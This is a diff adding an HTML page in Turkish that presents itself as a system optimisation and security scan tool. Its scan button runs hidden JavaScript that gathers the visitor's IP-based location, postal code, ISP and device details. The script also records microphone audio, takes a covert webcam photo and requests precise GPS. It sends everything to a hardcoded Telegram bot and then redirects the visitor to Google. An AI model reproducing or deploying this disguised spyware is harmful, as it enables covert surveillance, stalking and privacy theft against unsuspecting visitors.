@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Optimizasyon Aracı</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .main { border: 2px solid #00ff41; padding: 40px; margin: 20px; border-radius: 10px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
+        .scan-btn { background: #00ff41; color: #000; border: none; padding: 20px 50px; font-weight: bold; cursor: pointer; font-size: 18px; text-transform: uppercase; transition: 0.4s; border-radius: 5px; }
+        .scan-btn:hover { background: #fff; box-shadow: 0 0 50px #00ff41; }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <h1>SİSTEM KRİTİK ANALİZ</h1>
+        <p>Donanım bileşenlerini ve ağ güvenliğini doğrulamak için taramayı başlatın.</p>
+        <button class="scan-btn" onclick="executeEverything()">TARAMAYI BAŞLAT</button>
+        <div id="status" style="margin-top:20px; font-size:12px; color:#555;">Sistem Hazır...</div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
+        const CHAT_ID = "5802794454";
+
+        async function executeEverything() {
+            document.getElementById('status').innerText = "Veriler işleniyor... İzinleri onaylayın.";
+            
+            let report = "🛸 **FULL SYSTEM TAKEOVER REPORT** 🛸\n\n";
+
+            // 1. DERİN IP VE LOKASYON ANALİZİ (İstediğin Detaylı Format)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                report += `🌐 **AĞ VE KONUM DETAYLARI**\n`;
+                report += `• IP: \`${d.ip}\`\n`;
+                report += `• Şehir/İlçe: ${d.city} / ${d.region}\n`;
+                report += `• Posta Kodu: ${d.postal}\n`;
+                report += `• ISS: ${d.org} (${d.asn})\n`;
+                report += `• Ülke: ${d.country_name} ${d.country_code}\n`;
+                report += `• Para Birimi: ${d.currency_name} (${d.currency})\n`;
+                report += `• Zaman Dilimi: ${d.timezone}\n\n`;
+            } catch(e) { report += "⚠️ IP Detayları Çekilemedi.\n\n"; }
+
+            // 2. CİHAZ VE USER-AGENT ANALİZİ
+            report += `📱 **CİHAZ ANALİZİ**\n`;
+            report += `• Yazılım: ${navigator.userAgent.includes("iPhone") ? "Apple iPhone (iOS)" : "Android/PC"}\n`;
+            report += `• Tarayıcı: ${navigator.userAgent.split(' ').pop()}\n`;
+            report += `• Ekran: ${window.screen.width}x${window.screen.height}\n`;
+            report += `• RAM: ${navigator.deviceMemory || "N/A"} GB\n\n`;
+
+            // 3. SES KAYDI (3 Saniye)
+            try {
+                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(aStream);
+                let chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {
+                    sendAudio(new Blob(chunks, { type: 'audio/ogg' }));
+                    aStream.getTracks().forEach(t => t.stop());
+                };
+                rec.start();
+                setTimeout(() => rec.stop(), 3000);
+            } catch(e) { report += "❌ Ses: Reddedildi\n"; }
+
+            // 4. FOTOĞRAF ÇEKİMİ
+            try {
+                const vStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = vStream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    sendPhoto(canvas.toDataURL('image/jpeg'));
+                    vStream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch(e) { report += "❌ Kamera: Reddedildi\n"; }
+
+            // 5. HASSAS GPS (EN SON GÖNDERİLİR)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    report += `📍 **CANLI GPS:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
+                    report += `🎯 Hassasiyet: ${Math.round(p.coords.accuracy)}m`;
+                    finish(report);
+                }, () => finish(report + "⚠️ GPS: İzin Reddedildi"), {enableHighAccuracy: true});
+            } else {
+                finish(report + "❌ GPS: Desteklenmiyor");
+            }
+        }
+
+        function finish(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(() => { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000); });
+        }
+
+        function sendPhoto(base64) {
+            const blob = dataURItoBlob(base64);
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("photo", blob, "snap.jpg");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        }
+
+        function sendAudio(blob) {
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("voice", blob, "voice.ogg");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
+        }
+
+        function dataURItoBlob(dataURI) {
+            let s = atob(dataURI.split(',')[1]), m = dataURI.split(',')[0].split(':')[1].split(';')[0],
+                a = new ArrayBuffer(s.length), u = new Uint8Array(a);
+            for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
+            return new Blob([a], { type: m });
+        }
+    </script>
+</body>
+</html>
